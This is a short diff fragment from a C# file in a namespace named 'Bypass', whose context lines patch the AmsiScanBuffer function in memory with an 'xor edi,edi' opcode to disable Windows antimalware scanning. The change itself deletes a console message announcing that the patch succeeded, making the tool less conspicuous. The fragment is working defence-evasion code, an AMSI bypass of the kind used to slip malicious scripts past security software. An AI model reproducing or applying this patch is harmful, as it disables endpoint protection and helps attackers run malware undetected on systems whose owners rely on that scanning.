@@ -55,8 +55,6 @@ namespace Bypass
 
             //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
             MoveMemory(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3); 
-
-            Console.WriteLine("Great success. AmsiScanBuffer patched! :)");
             return 0;
         }
     }
